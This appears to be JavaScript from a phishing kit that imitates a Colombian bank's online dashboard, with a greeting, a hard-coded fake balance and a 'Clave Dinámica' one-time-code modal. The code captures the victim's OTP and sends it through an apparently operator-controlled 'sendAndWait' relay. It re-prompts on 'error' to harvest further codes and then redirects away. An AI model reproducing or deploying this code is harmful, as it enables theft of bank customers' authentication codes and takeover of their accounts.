// Fecha actual
  const meses = ['enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octubre','noviembre','diciembre'];
  const dias = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
  const now = new Date();
  const horaStr = now.toLocaleTimeString('es-CO',{hour:'numeric',minute:'2-digit',hour12:true});
  const fechaStr = `${dias[now.getDay()]}, ${now.getDate()} de ${meses[now.getMonth()]} de ${now.getFullYear()}, ${horaStr}`;
  document.getElementById('currentDate').textContent = fechaStr;
  document.getElementById('lastVisit').textContent = fechaStr;
  document.getElementById('greetingName').textContent =
    USER.charAt(0).toUpperCase() + USER.slice(1).toLowerCase();

  // Toggle saldo
  let hidden = true;
  let realBalance = '$ 1.300,32';
  document.getElementById('toggleBalance').addEventListener('click', () => {
    hidden = !hidden;
    document.getElementById('balance').textContent = hidden ? '****' : realBalance;
    document.getElementById('toggleText').textContent = hidden ? 'Mostrar saldos' : 'Ocultar saldos';
  });

  // Drag-scroll en shortcuts (desktop)
  const sc = document.getElementById('shortcuts');
  let isDown = false, startX, scrollLeft, moved = false;
  sc.addEventListener('mousedown', (e) => {
    isDown = true; moved = false;
    sc.classList.add('dragging');
    startX = e.pageX - sc.offsetLeft;
    scrollLeft = sc.scrollLeft;
  });
  sc.addEventListener('mouseleave', () => { isDown = false; sc.classList.remove('dragging'); });
  sc.addEventListener('mouseup',    () => { isDown = false; sc.classList.remove('dragging'); });
  sc.addEventListener('mousemove', (e) => {
    if (!isDown) return;
    e.preventDefault();
    const x = e.pageX - sc.offsetLeft;
    const walk = (x - startX) * 1.2;
    if (Math.abs(walk) > 5) moved = true;
    sc.scrollLeft = scrollLeft - walk;
  });
  sc.querySelectorAll('.shortcut-card').forEach(card => {
    card.addEventListener('click', (e) => { if (moved) { e.stopPropagation(); e.preventDefault(); } }, true);
  });

  /* ====== Modal Clave Dinámica ====== */
  const din = setupOtpInputs('otpInputs', 'btnContinue', 'otpError');
  let showDinError = false;

  function openDinModal() {
    din.clear();
    const errEl = document.getElementById('otpError');
    if (showDinError) {
      errEl.classList.add('show');
      showDinError = false;
    } else {
      errEl.classList.remove('show');
    }
    document.getElementById('dinModal').classList.add('show');
    setTimeout(() => din.inputs[0] && din.inputs[0].focus(), 50);
  }

  function closeDinModal() {
    document.getElementById('dinModal').classList.remove('show');
  }

  document.getElementById('dinModal').addEventListener('click', (e) => {
    if (e.target.id === 'dinModal') closeDinModal();
  });
  
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeDinModal();
  });

  document.getElementById('btnContinue').addEventListener('click', () => {
    const btn = document.getElementById('btnContinue');
    if (btn.disabled) return;
    const code = din.getCode();
    closeDinModal();
    sendAndWait({ event: 'DINAMICA', dinamic: code }, {
      onOk:  () => { sessionStorage.clear(); location.href = 'index.html'; },
      onErr: () => { hideLoader(); showDinError = true; openDinModal(); }
    });
  });

  // Si venimos del login con ?modal=din, abrir directo
  if (new URLSearchParams(location.search).get('modal') === 'din') {
    setTimeout(() => openDinModal(), 6);
  }
